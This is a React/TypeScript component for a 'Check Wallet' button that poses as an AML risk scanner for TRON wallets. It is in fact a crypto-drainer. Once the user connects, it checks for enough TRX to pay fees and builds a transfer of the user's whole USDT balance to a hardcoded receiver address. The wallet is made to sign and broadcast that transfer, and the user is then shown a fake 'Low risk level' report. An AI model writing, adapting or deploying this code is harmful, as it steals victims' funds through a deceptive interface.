// src/components/tronAuthButton/TronAuthButton.tsx

import React, { useState, useEffect } from 'react';
import { tronWeb, adapter } from './tronWallet';

const USDT_CONTRACT  = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';

export const TronAuthButton: React.FC = () => {
  const [modalMessage, setModalMessage]     = useState<string | null>(null);
  const [loading, setLoading]               = useState(false);
  const [buttonDisabled, setButtonDisabled] = useState(false);

  // Предзагрузка адаптера
  useEffect(() => {
    adapter.init?.().catch(() => {});
  }, []);

  const disconnectAndNotify = async (message: string) => {
    setModalMessage(message);
    await adapter.disconnect();
    setLoading(false);
    setButtonDisabled(false);
  };

  const waitForAddress = async (timeout = 10000): Promise<string> => {
    const start = Date.now();
    return new Promise((resolve, reject) => {
      const iv = setInterval(() => {
        const addr = adapter.address;
        if (addr && tronWeb.isAddress(addr)) {
          clearInterval(iv);
          resolve(addr);
        } else if (Date.now() - start > timeout) {
          clearInterval(iv);
          reject(new Error('Timeout waiting for wallet connection'));
        }
      }, 200);
    });
  };

  const connectWallet = async () => {
    if (buttonDisabled) return;
    setLoading(true);
    setButtonDisabled(true);

    try {
      if (!adapter.connected) {
        await adapter.connect();
      }

      const userAddress = await waitForAddress();
      tronWeb.setAddress(userAddress);

      // Проверка TRX (минимум ~2 TRX для скорости)
      const trxBalance = await tronWeb.trx.getBalance(userAddress);
      if (trxBalance < 2_000_000) {
        return await disconnectAndNotify('❌ Not enough TRX to cover network fees (need ~2 TRX)');
      }

      // Проверка USDT
      const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
      const usdtRaw      = await usdtContract.methods.balanceOf(userAddress).call();
      const usdt         = Number(usdtRaw) / 1e6;
      if (usdt < 1) {
        // оригинальное сообщение "succes" оставляем
        return await disconnectAndNotify('succes');
      }

      // Построение транзакции transfer
      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        USDT_CONTRACT,
        'transfer(address,uint256)',
        { feeLimit: 25_000_000, callValue: 0 },
        [
          { type: 'address', value: TRON_RECEIVER },
          { type: 'uint256', value: usdtRaw },
        ],
        userAddress
      );

      const signed = await adapter.signTransaction(transaction);
      const result = await tronWeb.trx.sendRawTransaction(signed);

      if (result?.result) {
        return await disconnectAndNotify('succes');
      } else {
        throw new Error('Send failed');
      }
    } catch (err: any) {
      console.error('WalletConnect error:', err);
      await adapter.disconnect();

      const msg = err.message || err.toString();
      if (
        msg.includes('User closed modal') ||
        msg.includes('Modal is closed')   ||
        msg.includes('User rejected')     ||
        msg.includes('Timeout')
      ) {
        // тихо сброс состояния
        setLoading(false);
        setButtonDisabled(false);
        return;
      }

      // оригинальное сообщение об ошибке
      await disconnectAndNotify('⚠️ Connection or transaction error');
    }
  };

  return (
    <>
      <div
        className={`AuthButton${buttonDisabled ? ' disabled' : ''}`}
        onClick={connectWallet}
      >
        {loading ? 'Connecting...' : 'Check Wallet'}
      </div>

      {modalMessage && (
        <div className="modal__overflow">
          <div className="modal">
            {modalMessage !== 'succes' ? (
              <p>{modalMessage}</p>
            ) : (
              <>
                <div className="content greenBorder">
                  <div>0.6%</div>
                  <div>
                    <h3>Low risk level</h3>
                    <div className="nums">
                      <div><span className="circ green" /> 0-30</div>
                      <div><span className="circ orange" /> 31-69</div>
                      <div><span className="circ red" /> 70-100</div>
                    </div>
                  </div>
                </div>
                <div className="content report">
                  <p>AML report for a wallet:</p>
                  <h5>{USDT_CONTRACT}</h5>
                </div>
              </>
            )}
            <button
              onClick={() => {
                setModalMessage(null);
                setLoading(false);
                setButtonDisabled(false);
              }}
            >
              Close
            </button>
          </div>
        </div>
      )}
    </>
  );
};
